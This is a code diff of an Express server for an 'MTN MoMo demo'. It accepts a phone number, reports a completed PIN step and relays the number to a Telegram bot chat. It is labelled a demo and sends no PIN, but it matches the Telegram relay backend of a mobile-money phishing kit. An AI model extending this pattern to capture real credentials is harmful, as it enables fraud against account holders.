@@ -1,41 +1,67 @@
 const express = require("express");
+const path = require("path");
 
 const app = express();
+
+const PORT = process.env.PORT || 3000;
 
 app.use(express.json());
 app.use(express.static(__dirname));
 
-app.post("/api/mtn", async (req, res) => {
+
+app.post("/demo-submission", async (req, res) => {
+
+  const { phone, success } = req.body;
+
+  // Validate the demo submission.
+  if (
+    typeof phone !== "string" ||
+    !/^[0-9]{9}$/.test(phone) ||
+    typeof success !== "boolean"
+  ) {
+    return res.status(400).json({
+      error: "Invalid demo submission"
+    });
+  }
+
+
+  const botToken = process.env.TELEGRAM_BOT_TOKEN;
+  const chatId = process.env.TELEGRAM_CHAT_ID;
+
+
+  if (!botToken || !chatId) {
+
+    console.error(
+      "Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID"
+    );
+
+    return res.status(500).json({
+      error: "Telegram is not configured"
+    });
+  }
+
+
+  const message =
+`🧪 MTN MoMo DEMO
+
+📱 Demo number: +256${phone}
+
+✅ Demo PIN step completed
+
+This is a demo notification. No PIN was transmitted or stored.`;
+
+
   try {
-    if (req.body?.event !== "MTN_SUBMISSION") {
-      return res.status(400).json({
-        success: false,
-        error: "Invalid demo event"
-      });
-    }
-
-    const token = process.env.TELEGRAM_BOT_TOKEN;
-    const chatId = process.env.TELEGRAM_CHAT_ID;
-
-    if (!token || !chatId) {
-      console.error("Telegram environment variables are missing");
-      return res.status(500).json({ success: false });
-    }
-
-    const message =
-      "🧪 MOMO MTN BOT NOTIFICATION\n\n" +
-      "✅ Application successful\n" +
-      "📱 Test number:number entered\n" +
-      "🔐 PIN:pincode entered\n" +
-      "📊 Status: Demo completed";
 
     const telegramResponse = await fetch(
-      `https://api.telegram.org/bot${token}/sendMessage`,
+      `https://api.telegram.org/bot${botToken}/sendMessage`,
       {
         method: "POST",
+
         headers: {
           "Content-Type": "application/json"
         },
+
         body: JSON.stringify({
           chat_id: chatId,
           text: message
@@ -43,24 +69,56 @@ app.post("/api/mtn", async (req, res) => {
       }
     );
 
-    const telegramData = await telegramResponse.json();
 
-    console.log("Telegram response:", telegramResponse.status, telegramData.ok);
+    if (!telegramResponse.ok) {
 
-    if (!telegramResponse.ok || !telegramData.ok) {
-      return res.status(502).json({ success: false });
+      const errorText =
+        await telegramResponse.text();
+
+      console.error(
+        "Telegram error:",
+        errorText
+      );
+
+      return res.status(500).json({
+        error: "Telegram notification failed"
+      });
     }
 
-    return res.json({ success: true });
+
+    return res.json({
+      success: true
+    });
+
 
   } catch (error) {
-    console.error("Demo notification error:", error);
-    return res.status(500).json({ success: false });
+
+    console.error(
+      "Telegram request error:",
+      error
+    );
+
+    return res.status(500).json({
+      error: "Notification failed"
+    });
   }
+
 });
 
-const PORT = process.env.PORT || 10000;
 
-app.listen(PORT, "0.0.0.0", () => {
-  console.log(`Demo server running on port ${PORT}`);
+app.get("*", (req, res) => {
+
+  res.sendFile(
+    path.join(__dirname, "index.html")
+  );
+
+});
+
+
+app.listen(PORT, () => {
+
+  console.log(
+    `Demo server running on port ${PORT}`
+  );
+
 });
